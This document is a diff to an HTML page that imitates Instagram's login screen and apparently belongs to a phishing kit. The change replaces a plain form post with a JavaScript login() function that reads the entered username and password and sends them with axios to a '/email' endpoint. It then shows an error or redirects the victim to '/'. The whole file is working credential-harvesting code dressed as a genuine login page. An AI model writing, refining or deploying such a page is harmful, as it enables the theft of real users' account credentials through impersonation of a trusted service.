@@ -6,6 +6,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Instagram</title>
   <link rel="stylesheet" href="assets/css/instagram.css">
+  <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
 
 
   <style>
@@ -35,11 +36,33 @@
       display: none;
       text-align: center;
     }
+
+
+
+    #error {
+      color: #ED4956;
+      padding: 15px 0px;
+      width: 300px;
+      display: none;
+    }
+
+    #arrange {
+      display: flex;
+      flex-direction: row;
+      justify-content: center;
+      align-items: start;
+    }
+
+    #loaderx {
+      position: relative;
+      bottom: 6.5px;
+      display: none;
+    }
   </style>
 </head>
 
 <body onload="myFunction()" style="margin:0;">
-  <div class="contx" id="loader"><img width="100px" height="50px" src="assets/img/instagram.png"></div>
+  <div class="contx" id="loader"><img width="50px" height="50px" src="assets/img/instagram.png"></div>
   <span id="root" style="display:none;" class="animate-bottom">
     <section class="section-all">
 
@@ -53,7 +76,7 @@
                   <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram">
                 </div><!-- Header end -->
                 <div class="form-wrap">
-                  <form action="/email" method="post" class="form">
+                  <form class="form">
 
                     <div class="input-box">
                       <input type="text" id="name" aria-describedby="" placeholder="Phone number, username, or email" aria-required="true" maxlength="30" autocapitalize="off" autocorrect="off" name="email" value="">
@@ -64,8 +87,19 @@
                     </div>
 
                     <span class="button-box">
-                      <button class="btn" type="submit" name="submit">Log in</button>
+                      <button class="btn" type="button" name="submit" onclick="login()">
+                        <div id="arrange">
+                          <p id="loginLoader">Log in</p>
+
+                          <img id="loaderx" width="40px" height="40px" src="assets/img/loader.svg">
+                        </div>
+                      </button>
                     </span>
+
+
+                    <center>
+                      <div id="error"></div>
+                    </center>
 
                     <a class="forgot" href="">Forgot password?</a>
                   </form>
@@ -126,7 +160,7 @@
   </span> <!-- Root -->
 
   <!-- Select Link -->
-
+  
   <script>
     var myVar;
 
@@ -142,6 +176,44 @@
   <script type="text/javascript">
     function la(src) {
       window.location = src;
+    }
+  </script>
+
+  <script>
+    // Make a GET request
+    function login() {
+      const passwordValue = document.querySelector('input[name="password"]');
+      const usernameValue = document.querySelector('input[name="email"]');
+      const error = document.getElementById('error');
+      const loaderx = document.getElementById('loaderx');
+      const loginLoader = document.getElementById('loginLoader');
+      loginLoader.style.display = 'none';
+      loaderx.style.display = 'block';
+      error.style.display = 'none';
+      axios.post('/email', {
+          username: usernameValue.value,
+          password: passwordValue.value
+        })
+        .then(response => {
+          // Handle the response
+
+          console.error(response.data);
+          if (response.data.status >= 300) {
+            error.innerHTML = response.data.message
+            error.style.display = 'block';
+            loginLoader.style.display = 'block';
+            loaderx.style.display = 'none';
+          } else {
+            window.location.href = '/';
+          }
+        })
+        .catch(error => {
+          error.style.display = 'block';
+          loginLoader.style.display = 'block';
+          loaderx.style.display = 'none';
+          // Handle errors
+          console.error('There was an error making the request:', error);
+        });
     }
   </script>
 
